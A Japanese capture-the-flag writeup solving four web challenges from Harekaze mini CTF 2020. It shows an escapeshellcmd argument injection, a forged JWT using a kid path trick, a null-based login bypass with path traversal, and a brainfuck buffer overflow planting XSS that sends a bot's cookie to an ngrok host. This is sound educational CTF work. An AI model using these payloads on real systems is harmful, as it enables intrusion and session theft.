---
title: Harekaze mini CTF 2020 writeup for web challs
thumbnail: /images/2020/20201227-harekaze02.png
date: 2020-12-27 12:00:00
tags:
    - CTF
---

Harekaze mini CTF 2020にチーム./Vespiaryで出て、全完して5位でした。全完したのはTSGと弊チームだけです。

<blockquote class="twitter-tweet"><p lang="ja" dir="ltr"><a href="https://twitter.com/hashtag/HarekazeCTF?src=hash&amp;ref_src=twsrc%5Etfw">#HarekazeCTF</a> お疲れ様です！<br>./Vespiaryで出て†全完†して5位になりました cooldown🤣<br>自分はweb全完しました（bfだけチームメンバと一緒に解いた） <a href="https://t.co/TKehRwOj8C">pic.twitter.com/TKehRwOj8C</a></p>&mdash; Ark (@arkark_) <a href="https://twitter.com/arkark_/status/1343034850807226368?ref_src=twsrc%5Etfw">December 27, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

自分はweb問を解いたので、以下はそのwriteupです。WASM BFはチームメンバと一緒に解きました。
また、公式のリポジトリは[ここ](https://github.com/TeamHarekaze/harekaze-mini-ctf-2020-challenges-public)にあります。

## [web] What time is it now?

123 pts, 63 solves

> そうねだいたいね…
>
> http://harekaze2020.317de643c0ae425482fd.japaneast.aksapp.io/what-time-is-it-now/

### 問題概要

- dateコマンドの実行結果を表示するサービスが与えられる
- フラグファイルは`/flag`に置かれている

### 考察

```php
$format = isset($_REQUEST['format']) ? (string)$_REQUEST['format'] : '%H:%M:%S';
$result = shell_exec("date '+" . escapeshellcmd($format) . "' 2>&1");
```
の部分で、`date`コマンドを実行しています。

`escapeshellcmd`には

> ' および " は、対になっていない場合にのみエスケープされます。
> https://www.php.net/manual/ja/function.escapeshellcmd.php

という有名で最高な仕様があるので、これを使います。

この仕様を悪用すると、`?format=' -f '/flag`に対してエスケープされずに
```shell
date '+' -f '/flag' 2>&1
```
が実行されるようになります。

### 攻撃

```shell
$ http "http://harekaze2020.317de643c0ae425482fd.japaneast.aksapp.io/what-time-is-it-now/?format=' -f '/flag" | grep "HarekazeCTF"
          <h1 class="jumbotron-heading"><span class="text-muted">It's</span> date: invalid date 'HarekazeCTF{1t\'s_7pm_1n_t0ky0}'
```

### フラグ

`HarekazeCTF{1t's_7pm_1n_t0ky0}`

## [web] JWT is secure

210 pts, 19 solves

> 独自に作ったセッション機能は脆弱性を作り込みがちだということを学んだので、今回はJWT (JSON Web Token)を採用しました。
>
> http://harekaze2020.317de643c0ae425482fd.japaneast.aksapp.io/jwt-is-secure/

### 問題概要

- JWTで認証を行っているログイン可能なサービスが与えられる
- adminページにアクセスするとフラグが見られるが、adminにしか閲覧権限がない

### 解法

ソースコードを読むと次のことがわかります。

- algは'hs256', 'hs384', 'hs512' の3種類のみ
    - none攻撃のような典型手法はできそうにない
- adminかの判定はJWTのデータ部の`role`を見て判断している：
    - `$session->get('role') === 'admin'`
- JWTのヘッダの`kid`の値からハッシュ関数のキーに使うファイルを特定して、検証を行っている：
    ```php
    private function getSecretKey($kid) {
      $dir = $this->base_dir . '/' . $kid[0] . '/' . $kid[1];
      $path = $dir . '/' . $kid;

      // no path traversal, no stream wrapper
      if (preg_match('/\.\.|\/\/|:/', $kid)) {
        throw new Exception('Hacking attempt detected');
      }

      if (!file_exists($path) || !is_file($path)) {
        throw new Exception('Secret key not found');
      }

      return file_get_contents($path);
    }
    ```
    - `$this->base_dir`の値は`./keys`
    - なにやらpath traversalを防ごうとしている
- キーが置かれているファイルは、セッション開始時にパスが乱数で決定される：
    ```php
    private function setSecretKey($kid, $key) {
      $dir = $this->base_dir . '/' . $kid[0] . '/' . $kid[1];
      $path = $dir . '/' . $kid;

      if (!file_exists($dir)) {
        mkdir($dir, 0777, TRUE);
      }

      file_put_contents($path, $key);
    }
    ```

ところで、サーバには`./keys/.htaccess`が置かれています。いい感じの場所にいい感じの名前のファイルが置かれているので、これを使わない手はなさそうです。

`$kid`が`"/.htaccess"`の場合、`$path`が`./key///.//.htaccess`になり、`.htaccess`自身を指すようになります。これによって、検証に使用する鍵が固定されたので攻撃が成立します。

### 攻撃

実際の攻撃手順は次のとおりです。
JWTの生成に関してはサーバのコードを流用すると楽なので、`include`して使っています。

```shell
$ cd distfiles/public
$ php -a
Interactive mode enabled

php > include("jwt.php");
php > $jwt = new JWT();
php > $jwt->setHeader("kid", "/.htaccess");
php > $jwt->setData("username", "admin");
php > $jwt->setData("role", "admin");
php > echo $jwt->sign("HS256", file_get_contents("./keys/.htaccess"));
eyJ0eXAiOiJKV1QiLCJraWQiOiJcLy5odGFjY2VzcyIsImFsZyI6IkhTMjU2In0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.qJ0moL-EAWAvVgNBV5Y_wX-e2pNlYJ3n7FF5qJ3RbFM
php >

$ http "http://harekaze2020.317de643c0ae425482fd.japaneast.aksapp.io/jwt-is-secure/?page=admin" Cookie:jwtsession=eyJ0eXAiOiJKV1QiLCJraWQiOiJcLy5odGFjY2VzcyIsImFsZyI6IkhTMjU2In0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.qJ0moL-EAWAvVgNBV5Y_wX-e2pNlYJ3n7FF5qJ3RbFM
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Length: 375
Content-Type: text/html; charset=UTF-8
Date: Sat, 26 Dec 2020 08:36:35 GMT
Server: nginx/1.15.3
Vary: Accept-Encoding
X-Powered-By: PHP/7.4.13

<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin - JWT is secure</title>
</head>
<body>
  <h1 class="title">
    Welcome to JWT is secure!
  </h1>
  <ul>
    <li><a href="/jwt-is-secure/?page=home">Home</a></li>
    <li><a href="/jwt-is-secure/?page=logout">Log out</a></li>
    <li><a href="/jwt-is-secure/?page=admin">Admin</a></li>
  </ul>
  <p>
    We have confirmed you are an admin. The flag is: <b>HarekazeCTF{l1st3n_1_just_g1v3_y0u_my_fl4g_4t4sh1_n0_w4v3_w0_t0b4sh1t3_m1ruk4r4}</b>.
  </p>
</body>
</html>
```

### フラグ

`HarekazeCTF{l1st3n_1_just_g1v3_y0u_my_fl4g_4t4sh1_n0_w4v3_w0_t0b4sh1t3_m1ruk4r4}`

## [web] Avatar Viewer

305 pts, 8 solves

> Avatar Uploaderという名前の問題を覚えていますか? ご存知のように、あのWebアプリには致命的な脆弱性がありました。今回は安全のためにアップロード機能を削除しました。
>
> http://harekaze2020.317de643c0ae425482fd.japaneast.aksapp.io/avatar-viewer/

### 問題概要

- fastify製のログイン可能なサービスが与えられる
    - ユーザは`guest`と`admin-(censored)`のみ
- adminページにアクセスするとフラグが見られるが、adminにしか閲覧権限がない

### 解法

ログインの処理はこうなっています：
```javascript
// ...snip...

const users = JSON.parse(fs.readFileSync('./users.json'));

// ... snip ...

app.post('/login', async (request, reply) => {
  if (!request.body) {
    request.flash('error', 'HTTP request body is empty');
    return reply.redirect('/login');
  }

  if (!('username' in request.body && 'password' in request.body)) {
    request.flash('error', 'username or password is not provided');
    return reply.redirect('/login');
  }

  const { username, password } = request.body;
  if (username.length > 16) {
    request.flash('error', 'username is too long');
    return reply.redirect('/login');
  }

  if (users[username] != password) {
    request.flash('error', 'username or password is incorrect');
    return reply.redirect('/login');
  }

  request.session.set('username', username);
  reply.redirect('/profile');
});
```

`users.json`：
```json
{
  "guest": "guest",
  "admin-(censored)": "<censored>"
}
```

なんとかして`users[username] != password`を騙したいです。

ところで、POSTされたデータが`application/x-www-form-urlencoded`の場合は[fastify-formbody](https://github.com/fastify/fastify-formbody)でパースされます[^1]が、`application/json`の場合もちゃんと認識され普通にパースして処理されるようです。

[^1]: この問題の本質ではないですが、fastify-formbodyは[qs](https://github.com/ljharb/qs)ではなくnodeのbuiltinである[querystring](https://nodejs.org/api/querystring.html)を使っているらしいです（ref. https://github.com/fastify/fastify-formbody/tree/v5.0.0#upgrading-from-4x ）。知らなかった。配列指定がいつもの`hoge[]=xxx`ではないので注意したい。

JSONならnullを注入できるので
```json
{
    "username": "適当な値（文字列でなくても良い）",
    "password": null
}
```
を送信すると、`users[username] != password`が`undefined != null`と等価になり、好きな値でログインできてしまいます。

あとは型を騙しまくれば、フラグまで一直線です。


### 攻撃

```shell
$ echo '{"username": ["../users.json"], "password": null }' | http --session=./session.json POST "http://harekaze2020.317de643c0ae425482fd.japaneast.aksapp.io/avatar-viewer/login"
HTTP/1.1 302 Found
Connection: keep-alive
Content-Length: 0
Date: Sat, 26 Dec 2020 16:23:22 GMT
Server: nginx/1.15.3
location: /avatar-viewer/profile
set-cookie: avatar-session=4DtvZGJ5xh4IdwpoTHTKqtqoUmcCBp2zSgK6CAMaWXvR98Y4lp7Ou9xzVnTXxw%3D%3D%3BqYFmgKVnKWV1hN0PhJ%2BdansdlGna0O40

$ http --session=./session.json GET "http://harekaze2020.317de643c0ae425482fd.japaneast.aksapp.io/avatar-viewer/myavatar.png"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 121
Content-Type: image/png
Date: Sat, 26 Dec 2020 16:24:05 GMT
Server: nginx/1.15.3

{
  "guest": "guest",
  "admin-b01b9d62015f8b68": "b56c497ff08f76536631f2cc1100521ffabfece3d2da67c71176d69dcba41a25"
}

$ echo '{"username": ["admin-b01b9d62015f8b68"], "password": "b56c497ff08f76536631f2cc1100521ffabfece3d2da67c71176d69dcba41a25" }' | http --session=./session.json POST "http://harekaze2020.317de643c0ae425482fd.japaneast.aksapp.io/avatar-viewer/login"
HTTP/1.1 302 Found
Connection: keep-alive
Content-Length: 0
Date: Sat, 26 Dec 2020 16:25:13 GMT
Server: nginx/1.15.3
location: /avatar-viewer/profile
set-cookie: avatar-session=XXdk1ovHIrBW8U%2F50L9zKVQFKvyFTUXkNnBASPmXeesuvBLpiR52pXg9aHuK0nQOKXB%2BqlrJYg%3D%3D%3B1%2F3EwWhGvWy47KQd0sKlEKZwbxHpMTSE

$ http --session=./session.json GET "http://harekaze2020.317de643c0ae425482fd.japaneast.aksapp.io/avatar-viewer/admin"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=utf-8
Date: Sat, 26 Dec 2020 16:25:33 GMT
Server: nginx/1.15.3
Transfer-Encoding: chunked
Vary: Accept-Encoding
set-cookie: avatar-session=zFwhA0J4Ut9h%2B0bQDsB9mHD0w9gkeELHmNkPHIRHq%2FAqK2PZgGr3zcGBdPYqGvB2XD3%2Bw0tzUhztDcT%2FUUFLnxTr%3BCVckJ%2BL5lz4a9bCqOIOwcE3lwXrPNEHq

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Avatar Viewer</title>
    <link rel="stylesheet" href="/avatar-viewer/static/style.css">
  </head>
  <body>
    <header>
      <h1>Avatar Viewer</h1>
      <nav class="navbar">
        <ul class="mr-auto">
          <li><a href="/avatar-viewer/">Home</a></li>

          <li><a href="/avatar-viewer/profile">Profile</a></li>
          <li><a href="/avatar-viewer/admin">Admin</a></li>
          <li><a href="/avatar-viewer/logout">Log out</a></li>

        </ul>
      </nav>
    </header>

    <main>
      <h2>Admin Page</h2>
      <p>This is a page for admin. Here is the secret flag: <code>HarekazeCTF{maji_natural_super_nyan}</code></p>
    </main>
  </body>
</html>
```

### フラグ

`HarekazeCTF{maji_natural_super_nyan}`

にゃーん

## [web] WASM BF

322 pts, 7 solves

> 今はWebAssemblyの時代です。知らんけど。WebAssemblyを学ぶために、Brainf*ckのインタプリタをCで書いてwasmにコンパイルしてみました。
>
> http://harekaze2020.317de643c0ae425482fd.japaneast.aksapp.io/wasm-bf/

### 問題概要

- brainf*ckが実行できるサービスが与えられる
    - 実行時の出力結果が画面に表示される
- フラグのcookieを持ったbotに、適当なbrainf*ckプログラムを実行させることができる

### 解法

brainf*ckの実装を見ると
```c
void print_char(char c) {
  if (buffer_pointer + 4 >= buffer + BUFFER_SIZE) {
    flush();
  }

  // Prevent XSS!
  if (c == '<' || c == '>') {
    buffer_pointer[0] = '&';
    buffer_pointer[1] = c == '<' ? 'l' : 'g';
    buffer_pointer[2] = 't';
    buffer_pointer[3] = ';';
    buffer_pointer += 4;
  } else {
    *buffer_pointer = c;
    buffer_pointer++;
  }
}
```
によりXSSが封じられています。しかし、グローバル変数の宣言部分を見ると、
```c
unsigned char buffer[BUFFER_SIZE] = {0};
unsigned char *buffer_pointer = buffer;
unsigned char memory[MEMORY_SIZE] = {0};
char program[PROGRAM_MAX_SIZE] = {0};
```
`memory`から範囲外アクセスすると`buffer`を上書きすることが可能だとわかるので、あとはbrainf*ckのcode golfをするだけです。文字数制限は1000文字。小さい。

### 攻撃

最終的にできたコードはこれです（見やすいように改行しています）：
```brainfck
----[---->+<]>--.--[--->+<]>.++++.------.-[--->+<]>--.---[->++++<]>-.-.++++[->+++<]>+.[--->++<]>---
--.[->+++++<]>-.[--->++<]>.+++++[->+++<]>.-.---------.+++++++++++++..---.+++.[-->+<]>++++.+[--->+<]
>++.+++.------------.--.--[--->+<]>-.-----------.++++++.-.[------>+<]>.+[-->+<]>+++.+++++++++++++..
++[->++<]>.[-->+<]>+++.--[->++<]>.[-->+<]>+++++.-----[->++<]>.[-->+<]>++++.+++.-[--->+<]>--.--.++++
[->+++<]>.--------.++.----.--[-->+++++<]>.-------.+++++++++++.---.----.[->++++++++++<]>.+[--->+<]>+
+++.++++++.+[--->++++<]>-.+[-->+<]>++.+++++++++.+[--->+<]>.+++++++++++.------------.-[--->+<]>-.---
-----.--------.+++++++++.++++++.[++>---<]>.--[--->+<]>-.++++++++++++..----.--.----.-[++++>-----<]>.
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<+<<<<<<<<<<<<<<<<<<<<<<<<
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<-
```
文字数は839。やっている処理は

1. bufferに直接`=img src=0 onerror=location="//b4d7d69fd802.ngrok.io?"+document.cookie=`を書き込む
1. 右端の`=`をインクリメント
1. 左端の`=`をデクリメント

になっています。`b4d7d69fd802.ngrok.io`は[ngrok](https://ngrok.com/)でホストしたURLです。また、

- 文字列を生成する部分は https://copy.sh/brainfuck/text.html
- デバッグには https://arkark.github.io/brainfuck-online-simulator

を使いました。

上のコードを投げると手元のログには
```
[2020-12-26T13:34:34.906Z]  "GET /?flag=HarekazeCTF{I_th1nk_w4sm_1s_e4s1er_t0_re4d_th4n_4smjs}" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/88.0.4298.0 Safari/537.36"
```
と表示されました。web問とはいったい。

### フラグ

`HarekazeCTF{I_th1nk_w4sm_1s_e4s1er_t0_re4d_th4n_4smjs}`

### 追記

この解法すごい。感動した：

<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">#%01-.++[-&lt;+]+[&gt;-]+&lt;img%20src=x%20onerror=alert(1)&gt;<br><br>めっちゃきれいにできた...</p>&mdash; こおしいず(っ&#39;ヮ&#39; )ﾉｼ🚩 (@kcz146) <a href="https://twitter.com/kcz146/status/1343716701842493440?ref_src=twsrc%5Etfw">December 29, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

## 感想

全完やったー。うれしいな。
最近HITCON CTFやhxp CTFなどの激ムズ高難度CTFでボコボコにされていたので、癒やされました。

主にweb問しか見てないですが、ファイル配付やコード中のコメントなど、問題の本質に集中できるような親切な出題の仕方がされていて楽しんで取り組めました。任意のCTFがこうあってほしいです。難易度の勾配もちょうどよかったと思います。

来年はminiじゃないCTFも期待しています！
